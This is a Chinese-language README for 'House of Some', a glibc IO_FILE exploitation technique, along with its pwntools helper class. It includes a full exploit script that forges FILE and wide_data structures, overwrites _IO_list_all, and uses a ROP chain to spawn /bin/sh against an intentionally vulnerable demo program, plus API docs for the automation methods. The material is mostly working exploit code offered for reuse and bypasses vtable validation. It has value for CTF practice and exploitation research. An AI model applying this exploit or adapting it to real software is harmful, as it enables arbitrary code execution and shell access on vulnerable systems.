# House of Some

一种新的IO_FILE利用思路，利用条件为

1. 已知glibc基地址
2. 可控的地址（可写入内容构造fake file）
3. 需要一次libc内任意地址写可控地址
4. 程序能正常退出或者通过exit()退出

House of some具有以下优点：

1. 无视目前的`IO_validate_vtable`检查（wide_data的vtable加上检查也可以打）
2. 第一次任意地址写要求低
3. 最后攻击提权是栈上ROP，可以不需要栈迁移
4. 源码级攻击，不依赖编译结果

详细思路见https://blog.csome.cc/p/house-of-some/

## 自动化

在exit退出之后使用如下脚本即可

```python
from House_of_some import HouseOfSome
io = process("./demo")

...

libc = ELF("./libc.so.6", checksec=None)
libc.address = libc_base
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io, ret_address)
```

- controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址

### 举个例子

```python
from pwn import *
from House_of_some import HouseOfSome

context.log_level = 'debug'
context.arch = 'amd64'

tob = lambda x: str(x).encode()
io = process("./demo")

io.recvuntil(b"[+] printf: ")
printf_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"printf_addr: {printf_addr:#x}")

def add(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"size> ", tob(size))
    
def write(addr, size, content):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"size> ", tob(size))
    io.sendlineafter(b"addr> ", tob(addr))
    io.sendafter(b"content> ", content)

def leave():
    io.sendlineafter(b"> ", b"3")

libc = ELF("./libc.so.6", checksec=None)
add(0x200)
io.recvuntil(b"[+] done ")
heap_addr = int(io.recvuntil(b"\n", drop=True), 16)
log.success(f"heap_addr: {heap_addr:#x}")

libc_base = printf_addr - libc.symbols["printf"]
log.success(f"libc_base: {libc_base:#x}")

_IO_file_jumps_addr = libc_base + 0x216600

fake_wide_data = flat({
    0xE0: _IO_file_jumps_addr - 0x48,
    0x18: 0,
    0x20: 1,
}, filler=b"\x00")

fake_file_read = flat({
    0x00: 0, # _flags
    0xc0: 2, # _mode
    0x70: 0, # _fileno
    0x28: 0, # _IO_write_ptr
    0x20: 0, # _IO_write_base
    0x82: 0, # _vtable_offset
    
    0x38: heap_addr + 0xe0 + 0xe8, # _IO_buf_base
    0x40: heap_addr + 0xe0 + 0xe8 + 0x400, # _IO_buf_end

    0xa0: heap_addr + 0xe0, # _wide_data
    0xd8: libc_base + 0x2160C0, # vtable

    0x68: heap_addr + 0xe0 + 0xe8, # _chain next file
}, filler=b"\x00")

payload = flat({
    0x00: fake_file_read,
    0xe0: fake_wide_data
})
# 构造第一个任意地址写的fake file
io.sendlineafter(b"content> ", payload)
write(libc_base + 0x21a680, 8, p64(heap_addr))
leave() # exit

libc.address = libc_base
fake_file_start = heap_addr + 0xe0 + 0xe8
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)

io.interactive()
```

demo.c源码

```python
#include<stdio.h>

int main(){
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    int c;
    printf("[+] printf: %p\n", &printf);
    while (1) {
        printf(
            "1. add heap.\n"
            "2. write libc.\n"
            "3. exit\n"
            "> "
        );
        scanf("%d", &c);
        if(c == 1) {
            int size;
            printf("size> ");
            scanf("%d", &size);
            char *p = malloc(size);
            printf("[+] done %p\n", p);
            printf("content> ");
            read(0, p, size);
        } else if(c == 2){
            size_t addr, size;
            printf("size> ");
            scanf("%lld", &size);
            printf("addr> ");
            scanf("%lld", &addr);
            printf("content> ");
            read(0, (char*)addr, size);
        } else {
            break;   
        }
        
    }
    
}
```

## Docs

### class HouseOfSome(libc, controled_addr, zero_addr=libc.symbols['_environ']-0x10)

**Parameters**

- libc([ELF](https://docs.pwntools.com/en/latest/elf/elf.html#pwnlib.elf.elf.ELF)) - libc文件ELF对象
- controled_addr(int) - 可写地址，作为延长的IO_list_all中的io file写入的起始地址
- zero_addr(int) - 内容常0的地址

house of some自动化payload生成类

**Example**

```python
hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)
```

#### bomb(io, retn_addr) -> None

直接一把梭提权，运用[pwntools自带工具ROP](https://docs.pwntools.com/en/latest/rop/rop.html)，其中执行函数为`rop.call('execve', [b'/bin/sh', 0, 0])`

**Parameters**

- io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
- retn_addr(int) - 在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移

#### read(fd, buf, len, end=0) -> bytes

**Parameters**

- fd(int) - 文件表述符
- buf(int) - 待写入的地址
- len(int) - 写入长度
- end(bool) - 是否为最后一个fake_file

#### write(fd, buf, len) -> bytes

**Parameters**

- fd(int) - 文件表述符
- buf(int) - 待读取的地址
- len(int) - 读取长度

#### bomb_raw(io, retn_addr) -> int

执行此函数之后，当前io处在等待输入，并即将写入ROP

**Parameters**

- io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
- retn_addr(int) - 在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移

**return**

返回泄露的栈地址，此栈地址是ROP的起始地址

